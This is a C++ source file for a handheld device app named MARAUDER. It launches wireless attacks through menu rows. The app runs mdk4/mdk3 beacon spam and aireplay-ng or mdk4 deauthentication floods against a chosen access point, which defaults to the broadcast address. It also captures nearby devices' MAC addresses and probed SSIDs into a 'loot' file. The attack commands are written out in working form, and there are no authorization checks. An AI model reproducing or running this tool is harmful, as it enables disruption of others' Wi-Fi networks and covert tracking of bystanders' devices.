// app_maraud.cpp — Wi-Fi attack/monitor sheet via tcpdump/mdk/aireplay.
// Auto-detects tools; stealth blocks transmit rows.

#include "app_maraud.h"
#include "UI/draw.h"
#include "UI/theme.h"
#include "hal/hal_storage.h"
#include "hal/hal_wifi.h"
#include "hal/hal_loot.h"
#include "os/scheduler.h"
#include "config.h"
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <cstdint>

#ifdef VOIDOS_RPI5
#include <unistd.h>
#include <sys/stat.h>
#include <fstream>
#include "hal/hal_probe.h"
#endif

// ── MENU ──────────────────────────────────────────────────────────────

static const char *LABELS[] = { "PWND", "BEACON", "DEAUTH", "SCOUT" };
static const uint8_t N_ROWS = sizeof(LABELS) / sizeof(LABELS[0]);
static uint8_t _row = 0;
static char    _status[40] = "READY";
static bool    _capture = false;

#ifdef VOIDOS_RPI5
static char    _ssids[6][33];        // beacon/pwn spoof SSIDs
static uint8_t _ssid_n = 1;
static char    _ap_bssid[18] = "ff:ff:ff:ff:ff:ff";
static uint8_t _deauth_count = 50;
#endif

// ── TOOL DETECTION + STEALTH GATE ─────────────────────────────────────

#ifdef VOIDOS_RPI5
static bool tool_present(const char *name) {
    char cmd[80];
    std::snprintf(cmd, sizeof(cmd), "command -v %s >/dev/null 2>&1", name);
    return std::system(cmd) == 0;
}
static bool monitor_ready() {
    // wlan0mon exists or a mon0 interface is up
    FILE *p = ::popen("iwinfo wlan0mon 2>/dev/null || iw dev 2>/dev/null | grep -q wlan0mon; echo $?", "r");
    if (p) { int r=1; std::fscanf(p,"%d",&r); ::pclose(p); return r==0; }
    return false;
}
#endif

// ── PWN / PROBE RING (shared with app_body via hal_probe) ───────────

void app_maraud_add_packet(const uint8_t *mac, const char *ssid) {
    (void)mac; (void)ssid;   // ingest happens inside hal_probe
}
uint16_t app_maraud_visible_count() { return hal_probe_visible_count(); }

static void capture_on() {
    if (hal_probe_running()) { _capture = true; return; }
    if (hal_probe_capture_start()) {
        _capture = true;
        std::snprintf(_status, sizeof(_status), "PWND ON wlan0mon");
    } else {
        std::snprintf(_status, sizeof(_status), "no tcpdump/mon0");
    }
}

static void capture_off() {
    hal_probe_capture_stop();
    _capture = false;
    // dump the shared ring to loot
    mkdir("/var/lib/void-os/loot", 0755);
    std::ofstream f("/var/lib/void-os/loot/pwn.csv", std::ios::trunc);
    if (f) for (uint16_t i = 0, n = hal_probe_visible_count(); i < n; ++i) {
        const ProbeDevice *e = hal_probe_at(i);
        if (!e) continue;
        f << (int)e->mac[0] << ":" << (int)e->mac[1] << ":... "
          << e->ssid << " x" << e->count << "\n";
    }
}
static void cap_pump() {
    hal_probe_tick();
    if (_capture && !hal_probe_running())
        std::snprintf(_status, sizeof(_status), "tcpdump died");
}

// ── MITM injection rows ───────────────────────────────────────────────
static bool block_transmit() {
    if (hal_wifi_is_stealth()) {
        std::snprintf(_status, sizeof(_status), "STL BLOCKS TX"); return true;
    }
    if (!monitor_ready()) {
        std::snprintf(_status, sizeof(_status), "no wlan0mon (run iw phy add)"); return true;
    }
    return false;
}

static void do_beacon() {
    if (block_transmit()) return;
    const char *tool = tool_present("mdk4") ? "mdk4" :
                       tool_present("mdk3") ? "mdk3" : "";
    if (!tool[0]) { std::snprintf(_status,sizeof(_status),"TOOL MISSING (mdk4/3)"); return; }
    char cmd[200];
    std::snprintf(cmd, sizeof(cmd),
        "%s wlan0mon b -f /var/lib/void-os/loot/ssids.txt 2>/dev/null "
        "& echo $! >/tmp/mdk.pid", tool);
    std::snprintf(_status, sizeof(_status), "BEACON SPAM (bg %s)", tool);
    std::system(cmd);
}
static void do_deauth() {
    if (block_transmit()) return;
    if (tool_present("aireplay-ng")) {
        char cmd[180];
        std::snprintf(cmd,sizeof(cmd),
            "aireplay-ng -0 %u -a %s wlan0mon 2>/dev/null & echo $! >/tmp/deauth.pid",
            _deauth_count, _ap_bssid);
        std::system(cmd);
        std::snprintf(_status,sizeof(_status),"DEAUTH 50x off %s",_ap_bssid);
    } else if (tool_present("mdk4")) {
        char cmd[160];
        std::snprintf(cmd,sizeof(cmd),"mdk4 wlan0mon d -B %s 2>/dev/null & echo $! >/tmp/deauth.pid",_ap_bssid);
        std::system(cmd);
        std::snprintf(_status,sizeof(_status),"DEAUTH via mdk4 %s",_ap_bssid);
    } else {
        std::snprintf(_status,sizeof(_status),"TOOL MISSING (aireplay/mdk4)");
    }
}
static void stop_bg() {
    std::system("pkill -F /tmp/mdk.pid 2>/dev/null; pkill -F /tmp/deauth.pid 2>/dev/null");
    std::snprintf(_status,sizeof(_status),"BG STOPPED");
}

// ── CONFIG ────────────────────────────────────────────────────────────

static void load_cfg() {
#ifdef VOIDOS_RPI5
    for (uint8_t i=0;i<6;++i) _ssids[i][0]=0;
    char buf[33];
    if (hal_storage_get_str("md_ssid", buf, sizeof(buf))) {
        std::snprintf(_ssids[0], sizeof(_ssids[0]), "%s", buf);
        _ssid_n = 1;
    } else std::snprintf(_ssids[0], sizeof(_ssids[0]), "FreeWiFi");
    if (hal_storage_get_str("md_ap", _ap_bssid, sizeof(_ap_bssid))) {}
    hal_storage_set_str("md_ssid", _ssids[0]);
    // seed ssids.txt for mdk file mode
    mkdir("/var/lib/void-os/loot",0755);
    std::ofstream f("/var/lib/void-os/loot/ssids.txt", std::ios::trunc);
    if (f) f << _ssids[0] << "\n";
#endif
}

// ── LIFECYCLE ─────────────────────────────────────────────────────────

void app_maraud_init() {
    load_cfg();
    _row = 0; _capture = false;
    hal_probe_init();
    hal_probe_clear();
    std::snprintf(_status, sizeof(_status), "READY");
}
void app_maraud_tick() {
#ifdef VOIDOS_RPI5
    cap_pump();
#endif
}
void app_maraud_suspend() {
#ifdef VOIDOS_RPI5
    capture_off();
    stop_bg();
#endif
}

// ── EVENTS ────────────────────────────────────────────────────────────

void app_maraud_event(Event e) {
    if (e.type == EVT_BTN_B_DOWN) {
#ifdef VOIDOS_RPI5
        capture_off(); stop_bg();
#endif
        std::snprintf(_status,sizeof(_status),"READY"); return;
    }
    if (e.type == EVT_POT_CHANGED) {
        _row = (e.data * N_ROWS) / 256;
        if (_row >= N_ROWS) _row = N_ROWS - 1;
        return;
    }
    // C: stop any background injector
    if (e.type == EVT_BTN_C_DOWN) {
#ifdef VOIDOS_RPI5
        stop_bg();
#endif
        return;
    }
    if (e.type != EVT_BTN_A_DOWN) return;
#ifdef VOIDOS_RPI5
    switch (_row) {
        case 0: if (_capture) capture_off(); else capture_on(); break;
        case 1: do_beacon(); break;
        case 2: do_deauth(); break;
        case 3: if (_capture) capture_off(); else { hal_probe_clear(); capture_on();
                    std::snprintf(_status,sizeof(_status),"SCOUT ON"); } break;
    }
#else
    std::snprintf(_status, sizeof(_status), "MARAUD: Linux only");
#endif
}

// ── DRAW ──────────────────────────────────────────────────────────────

void app_maraud_draw() {
    draw_fill(0,0,SCR_W,SCR_H,T_BG);
    draw_fill(0,0,SCR_W,STATS_H,T_PANEL);
    draw_hline(0,STATS_H,SCR_W,T_BORDER);
    draw_text(8, 8, "MARAUDER", T_FG, T_PANEL, FONT_SM);
    draw_textf(SCR_W-70, 8, _capture ? T_WARN : T_DIM, T_PANEL, FONT_SM,
               "CAP:%d", _capture);

    int row_h = 26;
    for (uint8_t i = 0; i < N_ROWS; ++i) {
        int y = STATS_H + 8 + i * row_h;
        draw_textf(8, y, i == _row ? T_FG : T_DIM, T_BG, FONT_SM,
                   "%s %s", i == _row ? ">" : " ", LABELS[i]);
    }

    int info_y = STATS_H + 8 + N_ROWS * row_h + 4;
#ifdef VOIDOS_RPI5
    if (_row == 0 || _row == 3) {
        uint16_t rn = hal_probe_visible_count();
        for (uint16_t i=0; i<rn && i<6; ++i) {
            const ProbeDevice *e = hal_probe_at(i);
            if (!e) continue;
            draw_textf(8, info_y + (int)i*11, T_DIM, T_BG, FONT_SM,
                       "%02x..%02x %-8s x%u",
                       e->mac[0], e->mac[5],
                       e->ssid[0]? e->ssid : "-", e->count);
        }
    } else {
        draw_textf(8, info_y, T_DIM, T_BG, FONT_SM, "mon:%d  tool: mdk/aireplay", monitor_ready());
        draw_textf(8, info_y+12, T_DIM, T_BG, FONT_SM, "AP: %s  SSID: %s", _ap_bssid, _ssids[0]);
    }
#else
    draw_textf(8, info_y, T_WARN, T_BG, FONT_SM, "LINUX ONLY");
#endif

    draw_textf(8, SCR_H - 40, T_DIM, T_BG, FONT_SM, "%s", _status);
    draw_hline(0, SCR_H - 16, SCR_W, T_BORDER);
    draw_text(8, SCR_H - 12, "[A] ARM/INJ  [C] STOP  [B] BACK", T_DIM, T_BG, FONT_SM);
}